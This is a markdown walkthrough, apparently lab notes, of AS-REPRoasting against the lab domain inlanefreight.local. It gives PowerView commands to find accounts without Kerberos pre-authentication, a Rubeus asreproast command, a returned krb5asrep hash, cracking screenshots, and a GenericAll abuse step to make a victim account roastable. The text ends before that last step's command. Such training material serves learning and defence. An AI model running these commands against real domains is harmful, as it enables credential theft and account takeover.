## AS-REPRoasting 

### Enumeration with PowerView
>
> - [PowerView](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1) can be used to enumate users with their **UserAccountControl (UAC)** property flag set to **DONT_REQ_PREAUTH**.

#### PowerView Usage

> The following command returns a list of valid user accounts via their samaccountname. We can create a user's file with them and use Rubeus to check for **DONT_REQ_PREAUTH** 

![PowerView Usernames](/Kerberos-Attacks/images/usernames.png) 


![PowerView DONT_REQ_PREAUTH](/Kerberos-Attacks/images/powerview-usage.png) 

> PS C:\Directory where PowerView ps1 is\> **Import-Module .\PowerView.ps1**
>
> PS C:\ > **Get-DomainUser -UacFilter DONT_REQ_PREAUTH**

### AS-REPRoasting with Rubeus
>
> Now that we have a list of users that **DONT_REQ_PREAUTH** Rubeus can be leveraged to retrieve the **AS-REP** in the proper format for offline hash cracking. This attack does not require and domain user context and can be done by just knowing the account name for the user without Kerberos pre-authentication set.

![Rubeus ASREProasting](/Kerberos-Attacks/images/rubeus.png) 


### Command line useage 
> C:\>.\Rubeus.exe asreproast /user:jenna.smith /domain:inlanefreight.local /dc:dc01.inlanefreight.local /nowrap /outfile:hashes.txt

#### Rubeus cli flags
>
> #### User flag
>  /user
> amber.smith
> jenna.smith
> carole.rose
>
> #### Domain flag
> /domain
> inlanefreight.local
>
> #### domain controller flag
> /dc
> dc01.inlanefreight.local
> 
> ### Returned hash for amber.smith account in **krb5asrep** format.  
> 
> $amber.smith@inlanefreight.local:7DF52772C351F219C9901234C31D4AB9$0A90184665F0932657A20A689F56A5BD0717A4E52C4F2E8BD88B18A0DA8C01A35ED6E61F0B92C6BA50BE7A798691680E4303FBF761DA896DFD6C7377B4F40CB9288FCD39D01C909C6E742675FFB90AB753BF55ABF37B2151E7A332F29D83321A6C217218BDCA8818CF64379D153B92B8230C126CB9D0AE0A22DF040DE8DAEB898C082BEF8A7888FD9FFC5C7B3D0130CC0BAC8F788D23797F7369A00C2D26FB4B45D5A85F7DDF61A875C2C038A06CDAA1E1AFACB1513D8B7B406B5497D383BA8AAFF2B797F246132929C706FE67B3FB0D8E3B1B011D30484AA6BECFF15C58756661B27C71A6BEF7E52F850B6C8B586D99E1E2C9C747A181E72959
>


## Cracking Hash with John / or hashcat  

![John-the-Ripper](/Kerberos-Attacks/images/hash-cracking.png) 


![Hashcat](/Kerberos-Attacks/images/hashcat.png) 

![Hashcat Password](/Kerberos-Attacks/images/password.png) 

## Further Exploitation

### Using PowerView to check and see if a user has **GenericAll** privileges
>
> PowerShell Command Line
>
> PS C:\> Get-ObjectAcl -SamAccountName amber.smith -ResolveGUIDs | ? {$_.ActiveDirectoryRights -eq "GenericAll"}

>
> As we can see the account amber.smith has GenericAll rights.
>

![Generic All Abuse](/Kerberos-Attacks/images/generic-all.png) 

### Set DONT_REQ_PREAUTH with PowerView  
>
> If we find that we have GenericAll privileges on an account, instead of resetting the account password, we can enable the DONT_REQ_PREAUTH flag to make a request to get the hash of this account and try to crack it. We can use PowerView to do it (make sure to replace "userName" with the actual username of the victim accout). 

